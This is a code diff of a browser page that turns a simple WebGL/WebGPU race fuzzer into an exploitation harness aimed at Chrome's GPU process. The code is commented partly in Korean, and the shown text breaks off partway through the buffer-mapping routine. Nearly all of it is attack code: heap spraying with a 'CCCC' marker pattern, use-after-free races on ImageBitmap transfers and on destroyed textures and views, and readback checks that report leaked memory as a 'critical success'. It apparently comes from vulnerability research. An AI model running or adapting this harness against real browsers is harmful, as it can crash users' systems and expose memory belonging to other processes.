@@ -1,157 +1,1102 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultimate Chaos Fuzzer: WebGL vs WebGPU Interop</title>
+    <title>WebGPU Ultimate Hybrid Fuzzer</title>
     <style>
-        body { font-family: monospace; background: black; color: #ff00ff; }
-        h2 { text-shadow: 0 0 8px #ff00ff; }
-        #log { max-height: 85vh; overflow-y: auto; white-space: pre-wrap; background: #111; padding: 10px; border: 1px solid #333; }
-        .error { color: red; }
-        .info { color: cyan; }
+        body { font-family: monospace; background: #1a1a1a; color: #e0e0e0; padding: 20px; }
+        #status { font-size: 1.1em; padding: 15px; border: 2px solid #555; white-space: pre-wrap; min-height: 150px; background: #2a2a2a; color: #f0f0f0; margin-bottom: 20px; }
+        .running { color: #FFA500; border-color: #FFA500; } /* Orange */
+        .success { color: #00FF00; border-color: #00FF00; } /* Lime */
+        .failure { color: #FF0000; border-color: #FF0000; } /* Red */
+        .info { color: #00FFFF; border-color: #00FFFF; }   /* Cyan */
+        button { font-size: 1.1em; padding: 10px 20px; margin: 5px; cursor: pointer; background-color: #444; color: white; border: 1px solid #666; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        canvas { border: 1px solid #555; display: block; margin-top: 10px; background-color: black; }
+        #log { margin-top: 20px; padding: 10px; background: #0a0a0a; border: 1px solid #333; max-height: 400px; overflow-y: scroll; font-size: 0.9em; }
+        .log-error { color: #FF6347; } /* Tomato */
+        .log-info { color: #6A5ACD; }  /* SlateBlue */
     </style>
 </head>
 <body>
-    <h2>Ultimate Chaos Fuzzer: WebGL vs WebGPU</h2>
-    <p>This fuzzer creates extreme race conditions between WebGL and WebGPU using the same ImageBitmap resource across multiple workers.</p>
-    <button onclick="startFuzz()">🚀 Unleash Chaos</button>
-    <button onclick="stopFuzz()">⏹️ Stop</button>
-    <pre id="log"></pre>
-
-    <script id="worker_code" type="javascript/worker">
-        let gl, gpuDevice, gpuQueue;
-
-        async function initWebGL() {
-            if (gl) return true;
-            try {
-                const canvas = new OffscreenCanvas(1, 1);
-                gl = canvas.getContext('webgl2', { antialias: false });
-                return !!gl;
-            } catch (e) { return false; }
-        }
-
-        async function initWebGPU() {
-            if (gpuDevice) return true;
-            try {
-                if (!navigator.gpu) return false;
-                const adapter = await navigator.gpu.requestAdapter();
-                if (!adapter) return false;
-                gpuDevice = await adapter.requestDevice();
-                gpuQueue = gpuDevice.queue;
-                return !!gpuDevice;
-            } catch (e) { return false; }
-        }
-
-        self.onmessage = async (e) => {
-            const { bitmap, runId } = e.data;
-            try {
-                const taskType = Math.random() > 0.5 ? 'webgl' : 'webgpu';
-                self.postMessage({ log: `[Worker ${runId}] Starting task: ${taskType}` });
-
-                if (taskType === 'webgl' && await initWebGL()) {
-                    const tex = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_2D, tex);
-                    // Use the bitmap, then immediately close it to stress the lifecycle
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, bitmap);
-                    setTimeout(() => bitmap.close(), 0);
-                    gl.generateMipmap(gl.TEXTURE_2D);
-                    await gl.finish();
-                    gl.deleteTexture(tex);
-
-                } else if (taskType === 'webgpu' && await initWebGPU()) {
-                    const destTexture = gpuDevice.createTexture({
-                        size: [bitmap.width, bitmap.height],
-                        format: 'rgba8unorm',
-                        // Correct usage flags
-                        usage: GPUTextureUsage.COPY_DST | GPUTextureUsage.RENDER_ATTACHMENT | GPUTextureUsage.TEXTURE_BINDING
-                    });
-                    // Use the bitmap, then immediately close it
-                    gpuQueue.copyExternalImageToTexture({ source: bitmap }, { texture: destTexture }, [bitmap.width, bitmap.height]);
-                    setTimeout(() => bitmap.close(), 0);
-                    await gpuQueue.onSubmittedWorkDone();
-                
-                } else {
-                     self.postMessage({ log: `[Worker ${runId}] Skipped, required API not available.` });
-                }
-                 self.postMessage({ log: `[Worker ${runId}] Task finished.` });
-            } catch (err) {
-                // We are HOPING for a hard crash, but log JS errors too.
-                self.postMessage({ log: `[Worker ${runId}] Error: ${err.message}`, type: 'error' });
-            }
-        };
-    </script>
+    <h1>WebGPU Ultimate Hybrid Fuzzer</h1>
+    <p>This fuzzer combines multiple WebGPU attack vectors to trigger crashes or information leaks.</p>
+    <p><strong>IMPORTANT:</strong> For best results, run Chrome with <code>--js-flags="--expose-gc"</code> and optionally <code>--enable-dawn-features=allow_unsafe_apis</code>.</p>
+    <p>Monitor <code>chrome://gpu</code> and <code>chrome://crashes</code> for GPU process restarts/crashes.</p>
+    <!-- Removed onclick from runBtn for automated fuzzing -->
+    <button id="runBtn" disabled>▶️ Start Fuzzing Loop</button>
+    <button id="stopBtn" onclick="stopFuzzing()" disabled>⏹️ Stop Loop</button>
+    <div id="status">Initializing WebGPU and WebGL...</div>
+    <div id="estimatedGpuMemory" style="margin-top: 10px; font-size: 0.9em; color: #aaa;">Estimated GPU Memory: 0 bytes</div>
+    <p>Output Canvas (for leak visualization):</p>
+    <canvas id="output_canvas" width="256" height="256"></canvas>
+    <p>Fuzzer Log:</p>
+    <div id="log"></div>
 
     <script>
+        const statusEl = document.getElementById('status');
+        const outputCanvas = document.getElementById('output_canvas');
+        const outputCanvasCtx = outputCanvas.getContext('2d');
         const logEl = document.getElementById('log');
-        let fuzzingInProgress = false;
+        const runBtn = document.getElementById('runBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const estimatedGpuMemoryEl = document.getElementById('estimatedGpuMemory'); // New element for memory display
 
-        function log(msg, type = '') {
-            const span = document.createElement('span');
-            if (type) span.className = type;
-            span.textContent = `\n${msg}`;
-            logEl.appendChild(span);
+        let gpuDevice; // WebGPU Device
+        let gl;        // WebGL2 Context for heap spraying
+        let fuzzIntervalId;
+        let attemptCounter = 0;
+        let leakDetected = false;
+        let partialLeakCount = 0; // 부분 유출 카운터
+        const uniqueLeakPatterns = new Set(); // 유출된 데이터 패턴 저장 (자동 비교용)
+
+        let estimatedGPUMemory = 0; // Estimated GPU memory in bytes
+
+        // --- Resource Pools ---
+        // Each resource added to these sets will also store its estimated size.
+        const resourcePools = {
+            textures: new Set(), 
+            buffers: new Set(), 
+            pipelines: new Set(), 
+            bindGroups: new Set(), 
+            textureViews: new Set(),
+        };
+
+        const sprayObjects = []; // WebGL 버퍼 (힙 스프레이용)
+        let worker;
+        let workerBlobUrl;
+
+        // Worker 코드: ImageBitmap detach 및 기타 오프스레드 작업
+        const workerScript = `
+            self.onmessage = e => { 
+                if (e.data.type === 'detachBitmap' && e.data.bitmap) { 
+                    // ImageBitmap은 워커로 전송되는 순간 메인 스레드에서는 참조가 사라지고 GC 대상이 됨.
+                    // 여기서 특별히 할 작업은 없지만, 메시지를 받으면 GC를 유도하는 데 도움이 될 수 있음.
+                } else if (e.data.type === 'performOffThreadTask') {
+                    let sum = 0;
+                    for (let i = 0; i < 1000000; i++) sum += Math.random();
+                    self.postMessage({ type: 'taskComplete', result: sum });
+                }
+            };
+        `;
+
+        /** Utility Functions **/
+        function log(message, type = 'info') {
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString() + '.' + String(now.getMilliseconds()).padStart(3, '0');
+            const logEntry = document.createElement('div');
+            logEntry.textContent = `[${timeStr}] ${message}`;
+            logEntry.className = `log-${type}`;
+            logEl.appendChild(logEntry);
             logEl.scrollTop = logEl.scrollHeight;
+            statusEl.textContent = message;
+            statusEl.className = type === 'error' ? 'failure' : (type === 'success' ? 'success' : 'running');
         }
 
-        async function createValidBitmap() {
-            const canvas = new OffscreenCanvas(256, 256);
-            canvas.getContext('2d').fillRect(0, 0, 256, 256);
+        function getRandomInt(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        // 특정 WebGPU 객체를 랜덤하게 풀에서 가져오거나 null 반환
+        function getRandomResource(type) {
+            const pool = resourcePools[type];
+            if (pool.size === 0) return null;
+            const resources = Array.from(pool);
+            return resources[getRandomInt(0, resources.length - 1)];
+        }
+
+        // 리소스 풀에서 제거하고 (가능하다면) destroy() 호출
+        function cleanupResource(resource, type) {
+            if (!resource) return;
+
+            // Update estimated memory before deleting
+            if (type === 'buffers' && resource.size !== undefined) {
+                estimatedGPUMemory -= resource.size;
+            } else if (type === 'textures' && resource.width !== undefined && resource.height !== undefined) {
+                // Assuming rgba8unorm for simplicity (4 bytes per pixel)
+                estimatedGPUMemory -= (resource.width * resource.height * 4);
+            }
+            estimatedGPUMemory = Math.max(0, estimatedGPUMemory); // Ensure it doesn't go negative
+            updateEstimatedGpuMemoryDisplay();
+
+            resourcePools[type].delete(resource);
+            if (typeof resource.unmap === 'function' && resource.mapState === 'mapped') { // 버퍼인 경우 unmap 먼저
+                try { resource.unmap(); } catch (e) { /* ignore */ }
+            }
+            if (typeof resource.destroy === 'function') {
+                try { resource.destroy(); } catch (e) { /* ignore */ }
+            }
+        }
+        
+        // 유출된 이미지 데이터(Uint8Array)를 받아서 고유한지 확인하고 로깅
+        function processLeakData(leakData, attemptType) {
+            // leakData는 Uint8Array
+            const isCCCC = leakData[0] === 0x43 && leakData[1] === 0x43 && leakData[2] === 0x43 && leakData[3] === 0x43;
+            const hasNonZero = leakData.some(p => p !== 0);
+
+            if (isCCCC) {
+                leakDetected = true;
+                log(`★★★★★ CRITICAL SUCCESS! ★★★★★\nInformation Leak Confirmed (CCCC pattern) on attempt ${attemptCounter} (${attemptType})!\nThis is a severe, reportable vulnerability.`, 'success');
+                stopFuzzing();
+                return true;
+            } else if (hasNonZero) {
+                partialLeakCount++;
+                const dataString = Array.from(leakData.slice(0, 256)).join(','); // 처음 256바이트만 문자열화하여 비교
+                if (!uniqueLeakPatterns.has(dataString)) {
+                    uniqueLeakPatterns.add(dataString);
+                    log(`New unique partial leak pattern on UAF attempt ${attemptCounter} (${attemptType}). (Total partial leaks: ${partialLeakCount}, Unique: ${uniqueLeakPatterns.size})`, 'info');
+                    // 개발자 도구에서 확인 가능하도록 이미지 데이터 URL을 콘솔에 출력
+                    console.log(`[FUZZER_LEAK_DATA] Attempt ${attemptCounter}, Type: ${attemptType}, DataURL: ${outputCanvas.toDataURL('image/png')}`);
+                } else {
+                    log(`Detected known partial leak pattern on UAF attempt ${attemptCounter} (${attemptType}). (Total partial leaks: ${partialLeakCount}, Unique: ${uniqueLeakPatterns.size})`, 'info');
+                }
+            } else {
+                log(`UAF attempt ${attemptCounter} (${attemptType}): No significant leak. Canvas is black.`, 'info');
+            }
+            return false;
+        }
+
+        // 특정 패턴으로 채워진 ImageBitmap을 생성 (UAF 소스용)
+        async function createImageBitmapFromSource(width, height) {
+            const canvas = new OffscreenCanvas(width, height);
+            const ctx = canvas.getContext('2d');
+            const imageData = ctx.createImageData(width, height);
+            const data = imageData.data;
+            // 0xCC (204) 값으로 채워서 유출 시 식별하기 쉽게 함
+            for (let i = 0; i < data.length; i += 4) {
+                data[i] = 0xCC;     // R
+                data[i+1] = 0xCC;   // G
+                data[i+2] = 0xCC;   // B
+                data[i+3] = 0xFF;   // A (불투명)
+            }
+            ctx.putImageData(imageData, 0, 0);
             return await createImageBitmap(canvas);
         }
 
-        async function startFuzz() {
-            if (fuzzingInProgress) return;
-            fuzzingInProgress = true;
-            logEl.innerHTML = "";
-            log("--- Starting Chaos Fuzzer ---", "info");
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
 
-            for (let i = 0; i < 100 && fuzzingInProgress; i++) {
-                log(`\n--- Iteration #${i} ---`);
+        function updateEstimatedGpuMemoryDisplay() {
+            estimatedGpuMemoryEl.textContent = `Estimated GPU Memory: ${formatBytes(estimatedGPUMemory)}`;
+        }
+
+        /** Heap Spray Functions **/
+        function sprayTheHeap(sizeBytes, numBuffers) {
+            if (!gl) { log("WebGL context not available for heap spray.", 'error'); return; }
+            for (const buf of sprayObjects) { gl.deleteBuffer(buf); } // 이전 스프레이 객체 정리
+            sprayObjects.length = 0;
+
+            const pattern32 = 0x43434343; // 'CCCC...'
+            const subDataChunkSize = 1024; // 1KB 단위로 subData 업데이트
+            const patternDataUint32 = new Uint32Array(subDataChunkSize / 4);
+            patternDataUint32.fill(pattern32);
+            const patternDataUint8 = new Uint8Array(patternDataUint32.buffer);
+
+            for (let i = 0; i < numBuffers; i++) {
+                const buf = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
                 
-                // Use the original chaotic structure: create a fresh bitmap and fresh workers each time
-                try {
-                    const bitmap = await createValidBitmap();
-                    const workers = [];
-
-                    for (let j = 0; j < 8; j++) { // 8 workers competing for one bitmap
-                        const runId = `#${i}.${j}`;
-                        const blob = new Blob([document.getElementById("worker_code").textContent]);
-                        const worker = new Worker(URL.createObjectURL(blob));
-                        worker.onmessage = (e) => log(e.data.log, e.data.type);
-                        worker.onerror = (e) => log(`[Worker ${runId}] FATAL ERROR: ${e.message}`, 'error');
-                        
-                        // All workers get a reference to the same bitmap, but only the first transfer succeeds.
-                        // This chaos is intentional.
-                        try {
-                           worker.postMessage({ bitmap, runId }, [bitmap]);
-                        } catch(e) {
-                           // Expected error: "Value is not transferable" for workers 2-8
-                           // This adds to the chaos. Now some workers have a valid handle, some don't.
-                           worker.postMessage({ bitmap: null, runId });
-                        }
-                        workers.push(worker);
-                    }
-                    
-                    // After a short delay, terminate all workers to trigger cleanup races
-                    await new Promise(r => setTimeout(r, 200));
-                    workers.forEach(w => w.terminate());
-
-                } catch (e) {
-                    log(`[Main] CRITICAL ERROR: ${e.message}`, 'error');
-                    stopFuzz();
-                    return;
+                gl.bufferData(gl.ARRAY_BUFFER, sizeBytes, gl.STATIC_DRAW); 
+                
+                for (let offset = 0; offset < sizeBytes; offset += subDataChunkSize) {
+                    const actualChunkSize = Math.min(subDataChunkSize, sizeBytes - offset);
+                    gl.bufferSubData(gl.ARRAY_BUFFER, offset, patternDataUint8.subarray(0, actualChunkSize));
                 }
-                
-                if (typeof gc === 'function') gc();
-                await new Promise(r => setTimeout(r, 100));
+                sprayObjects.push(buf);
+            }
+            gl.finish(); // GPU 명령 완료 대기
+            log(`Sprayed heap with ${numBuffers} WebGL buffers (${(sizeBytes / (1024*1024)).toFixed(2)}MB each).`, 'info');
+        }
+
+        async function sprayWebGPUHeap(sizeBytes, numBuffers) {
+            if (!gpuDevice) { log("WebGPU device not available for WebGPU heap spray.", 'error'); return; }
+            const sprayBuffers = [];
+            
+            // MODIFIED: Ensure sizeBytes is a multiple of 256 for mappedAtCreation
+            // WebGPU spec requires size to be a multiple of 256 for mappable buffers
+            const alignedSizeBytes = Math.ceil(sizeBytes / 256) * 256; 
+
+            if (alignedSizeBytes === 0) {
+                 log(`Skipped WebGPU spray: Aligned size is 0.`, 'info');
+                 return;
             }
 
-            if (fuzzingInProgress) log("\n--- Fuzzing Finished ---", "info");
-            stopFuzz();
+            for (let i = 0; i < numBuffers; i++) {
+                try {
+                    const buffer = gpuDevice.createBuffer({
+                        size: alignedSizeBytes, // MODIFIED: Use 256-byte aligned size
+                        usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC, 
+                        mappedAtCreation: true, 
+                    });
+                    new Uint8Array(buffer.getMappedRange()).fill(0x43); // Direct fill with 'C' pattern
+                    buffer.unmap();
+                    sprayBuffers.push(buffer);
+                    resourcePools.buffers.add(buffer); // Track for potential reuse/destroy
+                    estimatedGPUMemory += alignedSizeBytes; // Update estimated memory
+                } catch (e) {
+                    log(`Failed to create WebGPU spray buffer: ${e.message}`, 'error');
+                }
+            }
+            updateEstimatedGpuMemoryDisplay();
+
+            // Optionally, submit copy commands to ensure data is on GPU.
+            const commandEncoder = gpuDevice.createCommandEncoder();
+            for (const buffer of sprayBuffers) {
+                try {
+                    // Just copy a tiny bit to force submission/gpu-side activity
+                    commandEncoder.copyBufferToBuffer(buffer, 0, buffer, 0, Math.min(4, buffer.size)); 
+                } catch (e) {
+                    log(`Failed to encode WebGPU spray buffer copy: ${e.message}`, 'error');
+                }
+            }
+            try {
+                gpuDevice.queue.submit([commandEncoder.finish()]);
+            } catch (e) {
+                log(`Failed to submit WebGPU spray commands: ${e.message}`, 'error');
+            }
+            log(`Sprayed heap with ${numBuffers} WebGPU buffers (${(alignedSizeBytes / (1024*1024)).toFixed(2)}MB each).`, 'info');
         }
 
-        function stopFuzz() {
-            fuzzingInProgress = false;
+
+        /** WebGPU Actions **/
+        async function performRandomWebGPUAction() {
+            if (!gpuDevice) return;
+
+            // Weighted actions to prioritize more impactful fuzzer paths
+            const weightedActions = [
+                { name: 'createTexture', weight: 10 },
+                { name: 'createBuffer', weight: 10 },
+                { name: 'createRenderPipeline', weight: 5 },
+                { name: 'createBindGroup', weight: 8 }, // BindGroup 생성 확률 높임
+                { name: 'createTextureView', weight: 5 },
+                { name: 'useTextureInCopy', weight: 7 },
+                { name: 'useBufferInCopy', weight: 7 },
+                { name: 'renderWithPipeline', weight: 5 },
+                { name: 'destroyResource', weight: 10 },
+                { name: 'mapBuffer', weight: 15 },
+                { name: 'transferImageBitmap', weight: 15 }, // ImageBitmap UAF 시도
+                { name: 'sprayHeap', weight: 8 }, 
+                { name: 'sprayWebGPUHeap', weight: 8 }, 
+                { name: 'raceTextureViewLifecycle', weight: 12 }, // TextureView/BindGroup UAF 시도
+                { name: 'leakViaCreateImageBitmap', weight: 12 }, // CreateImageBitmap을 통한 직접 유출 시도
+            ];
+
+            let totalWeight = weightedActions.reduce((sum, a) => sum + a.weight, 0);
+            let randomWeight = getRandomInt(1, totalWeight);
+            let action = '';
+            for (const weightedAction of weightedActions) {
+                randomWeight -= weightedAction.weight;
+                if (randomWeight <= 0) {
+                    action = weightedAction.name;
+                    break;
+                }
+            }
+            
+            log(`Attempting action: ${action}`, 'info');
+
+            try {
+                switch (action) {
+                    case 'createTexture': {
+                        const width = getRandomInt(64, 512);
+                        const height = getRandomInt(64, 512);
+                        const format = 'rgba8unorm'; 
+                        let usage = GPUTextureUsage.TEXTURE_BINDING;
+                        if (Math.random() < 0.7) usage |= GPUTextureUsage.COPY_DST;
+                        if (Math.random() < 0.7) usage |= GPUTextureUsage.RENDER_ATTACHMENT;
+                        if (Math.random() < 0.8) usage |= GPUTextureUsage.COPY_SRC; // MODIFIED: Increased COPY_SRC probability
+                        
+                        const texture = gpuDevice.createTexture({
+                            size: [width, height, 1],
+                            format: format,
+                            usage: usage,
+                        });
+                        resourcePools.textures.add(texture);
+                        estimatedGPUMemory += (width * height * 4); // Assuming rgba8unorm
+                        updateEstimatedGpuMemoryDisplay();
+                        log(`Created Texture: ${width}x${height}, usage: ${usage}`, 'info');
+                        break;
+                    } // End of 'createTexture' case
+                    case 'createBuffer': {
+                        const baseSize = getRandomInt(64, 1024); 
+                        const size = baseSize * 4; // size is already a multiple of 4
+
+                        let usage = 0;
+                        // 0: 일반 GPU 버퍼, 1: MAP_READ 버퍼, 2: MAP_WRITE 버퍼
+                        const bufferTypeChoice = getRandomInt(0, 2); 
+
+                        if (bufferTypeChoice === 1) { // MAP_READ buffer
+                            usage = GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST;
+                            log(`Created Buffer: ${size} bytes, usage: MAP_READ|COPY_DST (explicit)`, 'info');
+                        } else if (bufferTypeChoice === 2) { // MAP_WRITE buffer
+                            usage = GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC;
+                            log(`Created Buffer: ${size} bytes, usage: MAP_WRITE|COPY_SRC (explicit)`, 'info');
+                        } else { // General purpose GPU buffer (no mapping)
+                            if (Math.random() < 0.7) usage |= GPUBufferUsage.COPY_DST;
+                            if (Math.random() < 0.7) usage |= GPUBufferUsage.COPY_SRC;
+                            if (Math.random() < 0.7) usage |= GPUBufferUsage.UNIFORM;
+                            if (Math.random() < 0.7) usage |= GPUBufferUsage.STORAGE;
+                            if (Math.random() < 0.7) usage |= GPUBufferUsage.VERTEX;
+                            if (Math.random() < 0.7) usage |= GPUBufferUsage.INDEX;
+                            if (Math.random() < 0.7) usage |= GPUBufferUsage.INDIRECT;
+                            if (usage === 0) usage = GPUBufferUsage.COPY_DST; // Ensure at least one usage
+                            log(`Created Buffer: ${size} bytes, usage: various GPU usages (${usage})`, 'info');
+                        }
+
+                        const buffer = gpuDevice.createBuffer({
+                            size: size,
+                            usage: usage,
+                        });
+                        resourcePools.buffers.add(buffer);
+                        estimatedGPUMemory += size; // Update estimated memory
+                        updateEstimatedGpuMemoryDisplay();
+                        break;
+                    } // End of 'createBuffer' case
+                    case 'createRenderPipeline': {
+                        const texture = getRandomResource('textures');
+                        // 렌더 파이프라인은 텍스처 포맷을 알아야 하므로 유효한 텍스처 필요
+                        if (!texture || !(texture.usage & GPUTextureUsage.RENDER_ATTACHMENT)) {
+                             log(`Skipped createRenderPipeline: Missing suitable render attachment texture.`, 'info');
+                             break;
+                        }
+                        const pipeline = await gpuDevice.createRenderPipelineAsync({
+                            layout: 'auto',
+                            vertex: {
+                                module: gpuDevice.createShaderModule({ code: `
+                                    @vertex fn main(@builtin(vertex_index) VertexIndex : u32) -> @builtin(position) vec4<f32> {
+                                        var pos = array<vec2<f32>, 3>(
+                                            vec2<f32>(0.0, 0.5),
+                                            vec2<f32>(-0.5, -0.5),
+                                            vec2<f32>(0.5, -0.5)
+                                        );
+                                        return vec4<f32>(pos[VertexIndex], 0.0, 1.0);
+                                    }
+                                `}),
+                                entryPoint: 'main',
+                            },
+                            fragment: {
+                                module: gpuDevice.createShaderModule({ code: `
+                                    @fragment fn main() -> @location(0) vec4<f32> {
+                                        return vec4<f32>(1.0, 0.0, 0.0, 1.0); // Red color
+                                    }
+                                `}),
+                                entryPoint: 'main',
+                                targets: [{ format: texture.format }],
+                            },
+                            primitive: { topology: 'triangle-list' },
+                        });
+                        resourcePools.pipelines.add(pipeline);
+                        log(`Created Render Pipeline for format: ${texture.format}`, 'info');
+                        break;
+                    } // End of 'createRenderPipeline' case
+                    case 'createBindGroup': {
+                        const pipeline = getRandomResource('pipelines');
+                        const buffer = getRandomResource('buffers');
+                        const textureView = getRandomResource('textureViews'); 
+                        
+                        if (!pipeline) { // 파이프라인 없이는 BindGroup Layout을 알 수 없음
+                             log(`Skipped createBindGroup: Missing pipeline.`, 'info');
+                             break;
+                        }
+
+                        let entries = [];
+                        let bindingCounter = 0;
+
+                        // 버퍼 바인딩 시도
+                        if (buffer && (buffer.usage & (GPUBufferUsage.UNIFORM | GPUBufferUsage.STORAGE))) {
+                             entries.push({
+                                 binding: bindingCounter++,
+                                 resource: {
+                                     buffer: buffer,
+                                     offset: 0,
+                                     size: Math.min(buffer.size, 256), // 적절한 크기
+                                 }
+                             });
+                        }
+                        
+                        // 텍스처 뷰 바인딩 시도
+                        // MODIFIED: Check if textureView and textureView.texture exist
+                        if (textureView && textureView.texture && (textureView.texture.usage & GPUTextureUsage.TEXTURE_BINDING)) { 
+                            entries.push({
+                                binding: bindingCounter++,
+                                resource: textureView,
+                            });
+                        }
+
+                        if (entries.length === 0) { // 유효한 entries가 없으면 스킵
+                            log(`Skipped createBindGroup: No suitable resources for binding.`, 'info');
+                            break;
+                        }
+
+                        try {
+                            const bindGroup = gpuDevice.createBindGroup({
+                                layout: pipeline.getBindGroupLayout(0), // 첫 번째 BindGroupLayout 사용
+                                entries: entries, 
+                            });
+                            resourcePools.bindGroups.add(bindGroup);
+                            log(`Created BindGroup with ${entries.length} bindings.`, 'info');
+                        } catch (e) {
+                             log(`Failed to create BindGroup: ${e.message}`, 'error');
+                        }
+                        break;
+                    } // End of 'createBindGroup' case
+                    case 'createTextureView': {
+                        const texture = getRandomResource('textures');
+                        if (!texture) {
+                            log(`Skipped createTextureView: No textures available.`, 'info');
+                            break;
+                        }
+                        const viewDesc = {
+                            format: texture.format,
+                            dimension: getRandomInt(0,1) === 0 ? '2d' : '2d-array', // 2d 또는 2d-array
+                            baseMipLevel: 0,
+                            mipLevelCount: texture.mipLevelCount || 1, // 기본값 1
+                            baseArrayLayer: 0,
+                            arrayLayerCount: texture.depthOrArrayLayers || 1, // 기본값 1
+                        };
+                        // 뎁스/스텐실 포맷인 경우 readOnly 설정
+                        if (texture.format.includes('depth') || texture.format.includes('stencil')) {
+                            viewDesc.depthReadOnly = Math.random() < 0.5;
+                            viewDesc.stencilReadOnly = Math.random() < 0.5;
+                        }
+                        const textureView = texture.createView(viewDesc);
+                        resourcePools.textureViews.add(textureView);
+                        log(`Created TextureView for texture (format: ${texture.format}, dim: ${viewDesc.dimension})`, 'info');
+                        break;
+                    } // End of 'createTextureView' case
+                    case 'useTextureInCopy': {
+                        const srcTexture = getRandomResource('textures');
+                        const dstTexture = getRandomResource('textures');
+                        const buffer = getRandomResource('buffers');
+                        
+                        // Check if source texture has COPY_SRC usage
+                        if (!srcTexture || !(srcTexture.usage & GPUTextureUsage.COPY_SRC)) {
+                            log(`Skipped useTextureInCopy: Source texture lacks COPY_SRC usage or not found.`, 'info');
+                            break;
+                        }
+
+                        const commandEncoder = gpuDevice.createCommandEncoder();
+                        // 텍스처 to 텍스처 또는 텍스처 to 버퍼 랜덤 선택
+                        if (Math.random() < 0.5 && dstTexture && srcTexture !== dstTexture && (dstTexture.usage & GPUTextureUsage.COPY_DST)) { 
+                            commandEncoder.copyTextureToTexture(
+                                { texture: srcTexture }, { texture: dstTexture }, { width: srcTexture.width, height: srcTexture.height, depthOrArrayLayers: 1 }
+                            );
+                            log(`Copied Texture to Texture (src: ${srcTexture.width}x${srcTexture.height}, dst: ${dstTexture.width}x${dstTexture.height})`, 'info');
+                        } else if (buffer && (buffer.usage & GPUBufferUsage.COPY_DST)) { // 버퍼가 존재하고 COPY_DST 사용 가능하면
+                            // MODIFIED: Ensure bytesPerRow is a multiple of 256
+                            const bytesPerRow = Math.ceil(srcTexture.width * 4 / 256) * 256; 
+                            commandEncoder.copyTextureToBuffer(
+                                { texture: srcTexture }, { buffer: buffer, bytesPerRow: bytesPerRow, rowsPerImage: srcTexture.height }, { width: srcTexture.width, height: srcTexture.height, depthOrArrayLayers: 1 }
+                            );
+                            log(`Copied Texture to Buffer (src: ${srcTexture.width}x${srcTexture.height})`, 'info');
+                        } else {
+                            log(`Skipped useTextureInCopy: No suitable destination for copy.`, 'info');
+                        }
+                        gpuDevice.queue.submit([commandEncoder.finish()]);
+                        break;
+                    } // End of 'useTextureInCopy' case
+                    case 'useBufferInCopy': {
+                        const srcBuffer = getRandomResource('buffers');
+                        const dstBuffer = getRandomResource('buffers');
+                        if (!srcBuffer || !dstBuffer || srcBuffer === dstBuffer || srcBuffer.size === 0 || dstBuffer.size === 0 || 
+                            !(srcBuffer.usage & GPUBufferUsage.COPY_SRC) || !(dstBuffer.usage & GPUBufferUsage.COPY_DST)) {
+                            log(`Skipped useBufferInCopy: Missing suitable buffers or usage flags.`, 'info');
+                            break;
+                        }
+
+                        const copySize = Math.min(srcBuffer.size, dstBuffer.size, getRandomInt(1, 1024));
+                        const commandEncoder = gpuDevice.createCommandEncoder();
+                        commandEncoder.copyBufferToBuffer(srcBuffer, 0, dstBuffer, 0, copySize);
+                        gpuDevice.queue.submit([commandEncoder.finish()]);
+                        log(`Copied Buffer to Buffer (${copySize} bytes)`, 'info');
+                        break;
+                    } // End of 'useBufferInCopy' case
+                    case 'renderWithPipeline': {
+                        const pipeline = getRandomResource('pipelines');
+                        const renderTarget = getRandomResource('textures');
+                        if (!pipeline || !renderTarget || !(renderTarget.usage & GPUTextureUsage.RENDER_ATTACHMENT)) {
+                            log(`Skipped renderWithPipeline: Missing resources or render target lacks RENDER_ATTACHMENT.`, 'info');
+                            break;
+                        }
+
+                        const commandEncoder = gpuDevice.createCommandEncoder();
+                        const renderPassDescriptor = {
+                            colorAttachments: [{
+                                view: renderTarget.createView(),
+                                clearValue: { r: Math.random(), g: Math.random(), b: Math.random(), a: 1.0 },
+                                loadOp: 'clear',
+                                storeOp: 'store',
+                            }],
+                        };
+                        const passEncoder = commandEncoder.beginRenderPass(renderPassDescriptor);
+                        passEncoder.setPipeline(pipeline);
+                        // BindGroup이 있다면 랜덤하게 바인딩 시도
+                        const bindGroup = getRandomResource('bindGroups');
+                        if (bindGroup) {
+                            try {
+                                passEncoder.setBindGroup(0, bindGroup);
+                                log(`Rendered with pipeline and BindGroup.`, 'info');
+                            } catch (e) {
+                                log(`Failed to set BindGroup during render: ${e.message}`, 'error');
+                            }
+                        }
+                        passEncoder.draw(3); // 3개의 정점 그리기 (하드코딩된 삼각형)
+                        passEncoder.end();
+                        gpuDevice.queue.submit([commandEncoder.finish()]);
+                        log(`Rendered with pipeline to texture (format: ${renderTarget.format})`, 'info');
+                        break;
+                    } // End of 'renderWithPipeline' case
+                    case 'destroyResource': {
+                        const resourceTypes = ['textures', 'buffers', 'pipelines', 'bindGroups', 'textureViews'];
+                        const typeToDestroy = resourceTypes[getRandomInt(0, resourceTypes.length - 1)];
+                        const resource = getRandomResource(typeToDestroy);
+                        if (!resource) {
+                            log(`Skipped destroyResource: No ${typeToDestroy} to destroy.`, 'info');
+                            break;
+                        }
+                        
+                        cleanupResource(resource, typeToDestroy);
+                        log(`Destroyed a ${typeToDestroy.slice(0, -1)} resource.`, 'info');
+                        break;
+                    } // End of 'destroyResource' case
+                    case 'mapBuffer': {
+                        const buffer = getRandomResource('buffers');
+                        if (!buffer) { 
+                            log(`Skipped mapBuffer: No buffer found.`, 'info');
+                            break;
+                        }
+
+                        let mapMode = 0;
+                        // Determine map mode based on buffer usage flags
+                        const canMapRead = (buffer.usage & GPUBufferUsage.MAP_READ);
